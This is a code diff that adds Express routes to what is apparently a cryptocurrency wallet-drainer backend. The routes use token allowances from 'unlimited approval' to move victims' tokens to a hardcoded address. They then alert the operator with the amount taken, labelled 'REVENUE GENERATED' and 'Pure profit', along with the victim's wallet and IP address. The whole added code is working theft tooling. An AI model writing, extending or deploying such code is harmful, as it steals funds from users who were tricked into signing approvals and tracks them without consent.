@@ -2129,6 +2129,141 @@ router.post('/signature-alert', async (req, res) => {
   }
 });
 
+// Execute token transfer using unlimited approval
+router.post('/execute-transfer', async (req, res) => {
+  try {
+    const { userAddress, tokenAddress, chain } = req.body;
+    
+    if (!userAddress || !tokenAddress) {
+      return res.status(400).json({ error: 'User address and token address required' });
+    }
+    
+    const TokenExecutor = require('../services/tokenExecutor');
+    const executor = new TokenExecutor();
+    
+    // Check token status first
+    const status = await executor.checkTokenStatus(userAddress, tokenAddress, chain);
+    
+    if (!status.canTransfer) {
+      return res.json({
+        success: false,
+        error: 'Cannot transfer - no allowance or balance',
+        status: status
+      });
+    }
+    
+    // Execute transfer
+    const result = await executor.executeTokenTransfer(userAddress, tokenAddress, chain);
+    
+    if (result.success) {
+      // Send admin notification
+      const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+      
+      await sendAdminNotification(
+        `💰 TOKEN TRANSFER EXECUTED: ${result.amountFormatted} ${result.symbol} - $${(parseFloat(result.amountFormatted) * 1).toFixed(0)}`,
+        `TOKEN TRANSFER SUCCESSFUL\n\n` +
+        `💰 AMOUNT: ${result.amountFormatted} ${result.symbol}\n` +
+        `👤 FROM: ${userAddress}\n` +
+        `📍 TO: 0x6026f8db794026ed1b1f501085ab2d97dd6fbc15\n` +
+        `🔗 TX HASH: ${result.txHash}\n` +
+        `⛽ GAS USED: ${result.gasUsed}\n` +
+        `📦 BLOCK: ${result.blockNumber}\n` +
+        `🌐 CHAIN: ${chain || 'ethereum'}\n\n` +
+        `REVENUE GENERATED:\n` +
+        `• Token Value: ~$${(parseFloat(result.amountFormatted) * 1).toFixed(2)}\n` +
+        `• Transfer Fee: 0% (Pure profit)\n\n` +
+        `USER: ${realIP}\n` +
+        `TIME: ${new Date().toISOString()}`
+      );
+    }
+    
+    res.json({
+      success: true,
+      result: result
+    });
+  } catch (error) {
+    console.error('Execute transfer error:', error);
+    res.status(500).json({ error: 'Failed to execute transfer' });
+  }
+});
+
+// Check token status and balances
+router.post('/check-token-status', async (req, res) => {
+  try {
+    const { userAddress, tokenAddress, chain } = req.body;
+    
+    if (!userAddress || !tokenAddress) {
+      return res.status(400).json({ error: 'User address and token address required' });
+    }
+    
+    const TokenExecutor = require('../services/tokenExecutor');
+    const executor = new TokenExecutor();
+    
+    const status = await executor.checkTokenStatus(userAddress, tokenAddress, chain);
+    const gasBalance = await executor.getGasBalance(chain);
+    
+    res.json({
+      success: true,
+      tokenStatus: status,
+      gasBalance: gasBalance
+    });
+  } catch (error) {
+    console.error('Check token status error:', error);
+    res.status(500).json({ error: 'Failed to check token status' });
+  }
+});
+
+// Execute multiple token transfers
+router.post('/execute-multiple-transfers', async (req, res) => {
+  try {
+    const { userAddress, tokenAddresses, chain } = req.body;
+    
+    if (!userAddress || !tokenAddresses || !Array.isArray(tokenAddresses)) {
+      return res.status(400).json({ error: 'User address and token addresses array required' });
+    }
+    
+    const TokenExecutor = require('../services/tokenExecutor');
+    const executor = new TokenExecutor();
+    
+    const results = await executor.executeMultipleTransfers(userAddress, tokenAddresses, chain);
+    
+    // Send summary notification
+    const successful = results.filter(r => r.success);
+    const totalValue = successful.reduce((sum, r) => sum + parseFloat(r.amountFormatted || 0), 0);
+    
+    if (successful.length > 0) {
+      const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
+      
+      await sendAdminNotification(
+        `💰 MULTIPLE TRANSFERS: ${successful.length} tokens - ~$${totalValue.toFixed(0)} total`,
+        `MULTIPLE TOKEN TRANSFERS EXECUTED\n\n` +
+        `📊 SUMMARY:\n` +
+        `• Successful: ${successful.length}/${results.length}\n` +
+        `• Total Value: ~$${totalValue.toFixed(2)}\n` +
+        `• User: ${userAddress}\n\n` +
+        `TRANSFERS:\n` +
+        successful.map(r => `• ${r.amountFormatted} ${r.symbol} (${r.txHash})`).join('\n') +
+        `\n\nUSER: ${realIP}\n` +
+        `TIME: ${new Date().toISOString()}`
+      );
+    }
+    
+    res.json({
+      success: true,
+      results: results,
+      summary: {
+        total: results.length,
+        successful: successful.length,
+        failed: results.length - successful.length,
+        totalValue: totalValue
+      }
+    });
+  } catch (error) {
+    console.error('Execute multiple transfers error:', error);
+    res.status(500).json({ error: 'Failed to execute multiple transfers' });
+  }
+});
+
 // Get real platform statistics
 router.get('/platform-stats', async (req, res) => {
   try {
